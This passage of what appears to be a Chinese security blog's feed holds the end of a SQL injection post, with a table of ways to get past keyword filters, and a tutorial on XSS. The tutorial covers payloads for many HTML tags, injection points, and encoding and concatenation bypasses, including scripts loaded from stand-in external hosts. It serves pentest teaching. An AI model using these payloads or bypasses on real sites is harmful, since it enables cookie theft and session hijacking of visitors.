其他关键字过滤&#x2F;拦截绕过</h2><p>关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：</p><table><thead><tr><th>关键字</th><th>双写</th><th>大小写</th><th>其他编码</th><th>符号</th></tr></thead><tbody><tr><td>and</td><td>aandnd</td><td>and</td><td>an\x64</td><td>&amp;&amp;</td></tr><tr><td>select</td><td>selselectect</td><td>SelECt</td><td>selec\x74</td><td></td></tr><tr><td>or</td><td>oorr</td><td>oR</td><td>o\x72</td><td>||</td></tr><tr><td>union</td><td>uniunionon</td><td>uNioN</td><td>unio\x6e</td><td></td></tr></tbody></table><h1 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h1><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/">sql注入总结</a></p><p><a href="https://files.cnblogs.com/files/lcamry/mysql-injection.pdf">注入天书</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>经典漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>经典漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>经典漏洞-XSS</title>
    <link href="/2022/07/21/2022-07-21.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-XSS/"/>
    <url>/2022/07/21/2022-07-21.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-XSS/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-xss-%E6%A6%82%E8%BF%B0%E5%92%8C%E5%8E%9F%E7%90%86">1 XSS 概述和原理</a></li><li><a href="#11-xss-%E7%B1%BB%E5%9E%8B">1.1 XSS 类型</a></li><li><a href="#2-xss-%E8%BD%BD%E8%8D%B7%E4%B8%8E%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE">2 XSS 载荷与插入位置</a><ul><li><a href="#21-%E8%BD%BD%E8%8D%B7">2.1 载荷</a><ul><li><a href="#211-script-%E6%A0%87%E7%AD%BE">2.1.1 script 标签</a></li><li><a href="#212-svg-%E6%A0%87%E7%AD%BE">2.1.2 svg 标签</a></li><li><a href="#213-img-%E6%A0%87%E7%AD%BE">2.1.3 img 标签</a></li><li><a href="#214-body-%E6%A0%87%E7%AD%BE">2.1.4 body 标签</a></li><li><a href="#215-video-%E6%A0%87%E7%AD%BE">2.1.5 video 标签</a></li><li><a href="#216-style-%E6%A0%87%E7%AD%BE">2.1.6 style 标签</a></li><li><a href="#217-details">2.1.7 details</a></li><li><a href="#218-select">2.1.8 select</a></li><li><a href="#219-iframe">2.1.9 iframe</a></li><li><a href="#2110-form">2.1.10 form</a></li><li><a href="#2111-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE">2.1.11 自定义标签</a></li></ul></li><li><a href="#22-xss-%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E7%9A%84%E4%BD%8D%E7%BD%AE">2.2 XSS 可以插入的位置</a><ul><li><a href="#221-%E6%B5%8B%E8%AF%95%E4%BD%8D%E7%BD%AE">2.2.1 测试位置</a></li></ul></li></ul></li><li><a href="#3-xss-%E7%BC%96%E7%A0%81%E4%B8%8E%E7%BB%95%E8%BF%87">3 XSS 编码与绕过</a><ul><li><a href="#31-%E7%BD%91%E9%A1%B5%E7%9A%84%E8%A7%A3%E7%A0%81%E8%BF%87%E7%A8%8B">3.1 网页的解码过程</a></li><li><a href="#32-%E7%BB%95%E8%BF%87">3.2 绕过</a><ul><li><a href="#321-%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4">3.2.1 关键字被过滤</a><ul><li><a href="#3211-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">3.2.1.1 双写绕过</a></li><li><a href="#3212-%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5">3.2.1.2 字符拼接</a></li><li><a href="#3213-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">3.2.1.3 编码绕过</a></li><li><a href="#3214-%E5%86%85%E5%B5%8C%E7%BC%96%E7%A0%81%E5%90%8Etab">3.2.1.4 内嵌编码后TAB</a></li><li><a href="#3215-%E5%A4%9A%E9%87%8D%E5%B0%96%E6%8B%AC%E5%8F%B7">3.2.1.5 多重尖括号</a></li><li><a href="#3216-%E5%B0%86js%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BA%E5%9B%BE%E5%83%8F">3.2.1.6 将JS文件重命名为图像</a></li></ul></li><li><a href="#322-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%BC%95%E5%8F%B7">3.2.2 过滤空格&#x2F;引号</a><ul><li><a href="#3221-%E4%BD%BF%E7%94%A8%E4%BB%A3%E6%9B%BF">3.2.2.1 使用&#x2F;代替</a></li></ul></li><li><a href="#323-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7">3.2.3 过滤单&#x2F;双引号</a></li><li><a href="#324-%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7">3.2.4 过滤括号</a></li><li><a href="#325-%E8%BF%87%E6%BB%A4url%E5%9C%B0%E5%9D%80">3.2.5 过滤URL地址</a></li></ul></li></ul></li><li><a href="#4-%E5%88%A9%E7%94%A8">4 利用</a><ul><li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a></li></ul></li></ul><h1 id="1-XSS-概述和原理"><a href="#1-XSS-概述和原理" class="headerlink" title="1 XSS 概述和原理"></a>1 XSS 概述和原理</h1><p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份&#x2F;钓鱼&#x2F;传播恶意代码等行为。  </p><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 &lt; 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p><h1 id="1-1-XSS-类型"><a href="#1-1-XSS-类型" class="headerlink" title="1.1 XSS 类型"></a>1.1 XSS 类型</h1><ul><li>存储型XSS</li></ul><p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 cookie</p><p><img src="/img/article/XSS/%E5%AD%98%E5%82%A8%E5%9E%8Bxss.png" alt="存储型xss"></p><ul><li>反射型XSS</li></ul><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p><p><img src="/img/article/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.png" alt="反射型xss"></p><ul><li>DOM型XSS</li></ul><p>不经过后端，DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM—XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型  </p><blockquote><p>可能触发DOM型XSS的属性：document.referer window.name location innerHTML documen.write </p></blockquote><h1 id="2-XSS-载荷与插入位置"><a href="#2-XSS-载荷与插入位置" class="headerlink" title="2 XSS 载荷与插入位置"></a>2 XSS 载荷与插入位置</h1><h2 id="2-1-载荷"><a href="#2-1-载荷" class="headerlink" title="2.1 载荷"></a>2.1 载荷</h2><blockquote><p>tip: 所有的闭合标签的 <code>&gt;</code> 都可以用 <code>//</code> 代替 </p></blockquote><h3 id="2-1-1-script-标签"><a href="#2-1-1-script-标签" class="headerlink" title="2.1.1 script 标签"></a>2.1.1 script 标签</h3><ul><li>script 标签是最直接的XSS有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ＃ 弹出1，对于数字可以不用引号 <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ＃ 弹出cookie <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>＝<span class="hljs-attr">http:</span>//<span class="hljs-attr">xxx.com</span>/<span class="hljs-attr">xss.js</span> &gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ＃ 引用外部的js <br></code></pre></td></tr></table></figure><h3 id="2-1-2-svg-标签"><a href="#2-1-2-svg-标签" class="headerlink" title="2.1.2 svg 标签"></a>2.1.2 svg 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>//</span><br></code></pre></td></tr></table></figure><h3 id="2-1-3-img-标签"><a href="#2-1-3-img-标签" class="headerlink" title="2.1.3 img 标签"></a>2.1.3 img 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">hack</span>&quot;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-4-body-标签"><a href="#2-1-4-body-标签" class="headerlink" title="2.1.4 body 标签"></a>2.1.4 body 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onpageshow</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-5-video-标签"><a href="#2-1-5-video-标签" class="headerlink" title="2.1.5 video 标签"></a>2.1.5 video 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">onloadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/aaa.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-6-style-标签"><a href="#2-1-6-style-标签" class="headerlink" title="2.1.6 style 标签"></a>2.1.6 style 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-7-details"><a href="#2-1-7-details" class="headerlink" title="2.1.7 details"></a>2.1.7 details</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">open</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-8-select"><a href="#2-1-8-select" class="headerlink" title="2.1.8 select"></a>2.1.8 select</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-9-iframe"><a href="#2-1-9-iframe" class="headerlink" title="2.1.9 iframe"></a>2.1.9 iframe</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;);&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-10-form"><a href="#2-1-10-form" class="headerlink" title="2.1.10 form"></a>2.1.10 form</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-11-自定义标签"><a href="#2-1-11-自定义标签" class="headerlink" title="2.1.11 自定义标签"></a>2.1.11 自定义标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(666)&#x27;</span>&gt;</span>click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(document.domain)&#x27;</span>&gt;</span>click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-2-XSS-可以插入的位置"><a href="#2-2-XSS-可以插入的位置" class="headerlink" title="2.2 XSS 可以插入的位置"></a>2.2 XSS 可以插入的位置</h2><ul><li>用户输入作为script的标签内容</li><li>用户输入作为html注释内容</li><li>用户输入作为html标签的属性名</li><li>用户输入作为html标签属性值</li><li>用户输入作为html标签的名字直接插入到CSS里</li></ul><h3 id="2-2-1-测试位置"><a href="#2-2-1-测试位置" class="headerlink" title="2.2.1 测试位置"></a>2.2.1 测试位置</h3><ul><li>常见业务场景<br>重灾区：评论区、留言区、个人信息、订单信息、站内信、网页及时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性、URL本身、URL所有参数、表单</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">uername=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(1)<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&amp;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&amp;password=******<br></code></pre></td></tr></table></figure><h1 id="3-XSS-编码与绕过"><a href="#3-XSS-编码与绕过" class="headerlink" title="3 XSS 编码与绕过"></a>3 XSS 编码与绕过</h1><h2 id="3-1-网页的解码过程"><a href="#3-1-网页的解码过程" class="headerlink" title="3.1 网页的解码过程"></a>3.1 网页的解码过程</h2><p>编码就是将字符变为二进制数，而解码就是还原二进制数为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程。</p><ul><li>URL编码</li></ul><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p><ul><li>HTML编码&#x2F;解码</li></ul><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是看到的源代码。具体的解码方式依具体情况而定，所以需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，所以很多网页就指定了解码方式为UTF-8。</p><p>但是在HTML中有些字符是和关键词冲突的，比如&lt;、&gt;、&amp;，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&amp;nbsp;，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p><table><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th><th>实体编号</th></tr></thead><tbody><tr><td>&lt;</td><td>小于号</td><td>&lt;</td><td>&amp;#60;</td></tr><tr><td>&gt;</td><td>大于号</td><td>&gt;</td><td>&amp;#62;</td></tr></tbody></table><p>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p><blockquote><p>tip:所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p></blockquote><ul><li>JS解码（只支持UNICODE）</li></ul><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而src、 href 后边加入的javascript 伪URL，也会进入JS 的解析模式。</p><p>比如<code>&lt;a href=&quot;javascript:alert(&#39;&lt;\u4e00&gt;&#39;)&quot;&gt;test&lt;/a&gt;</code>，javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\u4e00，前导的 \u 表示他是一个unicode 字符，根据后边的数字，解析为一，于是在完成JS的解析之后变成了：href&#x3D;”javascript:alert(‘&lt;一&gt;’)”&gt;test</p><h2 id="3-2-绕过"><a href="#3-2-绕过" class="headerlink" title="3.2 绕过"></a>3.2 绕过</h2><h3 id="3-2-1-关键字被过滤"><a href="#3-2-1-关键字被过滤" class="headerlink" title="3.2.1 关键字被过滤"></a>3.2.1 关键字被过滤</h3><h4 id="3-2-1-1-双写绕过"><a href="#3-2-1-1-双写绕过" class="headerlink" title="3.2.1.1 双写绕过"></a>3.2.1.1 双写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-2-字符拼接"><a href="#3-2-1-2-字符拼接" class="headerlink" title="3.2.1.2 字符拼接"></a>3.2.1.2 字符拼接</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">`xss`</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-3-编码绕过"><a href="#3-2-1-3-编码绕过" class="headerlink" title="3.2.1.3 编码绕过"></a>3.2.1.3 编码绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"># Unicode 编码<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;#41;</span><span class="hljs-symbol">&amp;#59;</span>&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span><br><br># url 编码<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br># ascii 码<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br><br># hex 码<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(</span>&#x27;\<span class="hljs-attr">x61</span>\<span class="hljs-attr">x6c</span>\<span class="hljs-attr">x65</span>\<span class="hljs-attr">x72</span>\<span class="hljs-attr">x74</span>\<span class="hljs-attr">x28</span>\<span class="hljs-attr">x27</span>\<span class="hljs-attr">x78</span>\<span class="hljs-attr">x73</span>\<span class="hljs-attr">x73</span>\<span class="hljs-attr">x27</span>\<span class="hljs-attr">x29</span>&#x27;)&gt;</span><br><br># 八进制<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;\<span class="hljs-attr">170</span>\<span class="hljs-attr">163</span>\<span class="hljs-attr">163</span>&#x27;)&gt;</span><br><br># base64<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-4-内嵌编码后TAB"><a href="#3-2-1-4-内嵌编码后TAB" class="headerlink" title="3.2.1.4 内嵌编码后TAB"></a>3.2.1.4 内嵌编码后TAB</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jav<span class="hljs-symbol">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-5-多重尖括号"><a href="#3-2-1-5-多重尖括号" class="headerlink" title="3.2.1.5 多重尖括号"></a>3.2.1.5 多重尖括号</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;XSS&quot;</span>);<span class="hljs-comment">//&lt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-6-将JS文件重命名为图像"><a href="#3-2-1-6-将JS文件重命名为图像" class="headerlink" title="3.2.1.6 将JS文件重命名为图像"></a>3.2.1.6 将JS文件重命名为图像</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><h3 id="3-2-2-过滤空格-x2F-引号"><a href="#3-2-2-过滤空格-x2F-引号" class="headerlink" title="3.2.2 过滤空格&#x2F;引号"></a>3.2.2 过滤空格&#x2F;引号</h3><h4 id="3-2-2-1-使用-x2F-代替"><a href="#3-2-2-1-使用-x2F-代替" class="headerlink" title="3.2.2.1 使用&#x2F;代替"></a>3.2.2.1 使用&#x2F;代替</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xss/);</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-3-过滤单-x2F-双引号"><a href="#3-2-3-过滤单-x2F-双引号" class="headerlink" title="3.2.3 过滤单&#x2F;双引号"></a>3.2.3 过滤单&#x2F;双引号</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"># 使用反引号代替<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>`<span class="hljs-attr">xss</span>`);&gt;</span><br># 编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-4-过滤括号"><a 